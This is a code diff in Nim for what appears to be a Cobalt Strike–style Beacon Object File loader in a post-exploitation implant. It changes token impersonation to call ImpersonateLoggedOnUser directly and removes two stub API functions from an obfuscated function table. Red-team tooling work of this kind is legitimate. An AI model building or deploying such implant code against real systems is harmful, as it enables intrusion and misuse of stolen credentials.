@@ -2,7 +2,6 @@ import winim/lean
 import ptr_math
 import strformat
 import ../../../common/utils 
-import ./token
 
 #[
     References: 
@@ -294,11 +293,8 @@ proc BeaconDownload(filename: PCHAR, buffer: PCHAR, length: uint): BOOL {.stdcal
     Token Functions
 ]#
 proc BeaconUseToken(token: HANDLE): BOOL {.stdcall.} =
-    try:
-        impersonate(token)
-        return TRUE
-    except:
-        return FALSE
+    if ImpersonateLoggedOnUser(token) == 0: return FALSE
+    return TRUE
 
 proc BeaconRevertToken(): void {.stdcall.} =
     discard RevertToSelf()
@@ -410,15 +406,7 @@ proc BeaconRemoveValue(key: PCHAR): BOOL {.stdcall.} =
     except:
         return FALSE
 
-proc BeaconWakeup() {.stdcall.} = 
-    # Set wakeup event
-    discard 
-
-proc BeaconGetStopJobEvent(): HANDLE {.stdcall.} = 
-    # Return stop event
-    discard
-
-var beaconApiAddresses*: array[34, tuple[name: string, address: PVOID]] = [
+var beaconApiAddresses*: array[32, tuple[name: string, address: PVOID]] = [
     (protect("BeaconDataParse"), BeaconDataParse),
     (protect("BeaconDataPtr"), BeaconDataPtr),
     (protect("BeaconDataInt"), BeaconDataInt),
@@ -447,8 +435,6 @@ var beaconApiAddresses*: array[34, tuple[name: string, address: PVOID]] = [
     (protect("BeaconAddValue"), BeaconAddValue),
     (protect("BeaconGetValue"), BeaconGetValue),
     (protect("BeaconRemoveValue"), BeaconRemoveValue),
-    (protect("BeaconWakeup"), BeaconWakeup),
-    (protect("BeaconGetStopJobEvent"), BeaconGetStopJobEvent),
     (protect("LoadLibraryA"), LoadLibraryA),
     (protect("GetProcAddress"), GetProcAddress),
     (protect("GetModuleHandleA"), GetModuleHandleA),
